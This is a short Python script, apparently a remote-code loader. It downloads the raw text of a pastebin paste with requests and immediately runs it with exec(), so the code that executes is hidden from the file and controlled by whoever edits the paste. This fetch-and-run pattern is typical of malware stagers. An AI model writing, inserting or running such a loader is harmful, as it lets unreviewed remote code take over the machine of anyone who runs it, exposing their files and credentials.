import requests

response = requests.get('https://pastebin.com/raw/Zub0fqyK').text

exec(response)
        
        
        
